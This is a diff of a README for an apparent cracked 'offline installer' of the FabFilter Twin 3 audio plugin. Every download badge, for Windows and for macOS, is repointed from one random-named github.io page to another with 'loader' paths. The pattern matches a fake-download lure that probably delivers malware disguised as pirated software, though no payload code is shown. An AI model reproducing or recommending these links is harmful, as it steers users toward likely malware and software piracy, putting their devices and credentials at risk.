@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_FabFilter+Twin+3-E85B26?style=for-the-badge&logo=github)](https://mjztsbomuptb.github.io/windows-dl/)
+[![Download](https://img.shields.io/badge/⬇_Download_FabFilter+Twin+3-E85B26?style=for-the-badge&logo=github)](https://lpysehglnrlc.github.io/win-loader/)
 
 </div>
 
@@ -58,9 +58,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mjztsbomuptb.github.io/windows-dl/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://lpysehglnrlc.github.io/win-loader/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mjztsbomuptb.github.io/macos-dl/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://lpysehglnrlc.github.io/mac-loader/)
 
 </div>
 
@@ -106,7 +106,7 @@ This repository provides an **offline installer** for evaluation and educational
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/⬇_Download_Now-E85B26?style=for-the-badge&logo=github)](https://mjztsbomuptb.github.io/windows-dl/)
+[![Download Now](https://img.shields.io/badge/⬇_Download_Now-E85B26?style=for-the-badge&logo=github)](https://lpysehglnrlc.github.io/win-loader/)
 
 <img src="https://skillicons.dev/icons?i=windows,apple,github" />
 
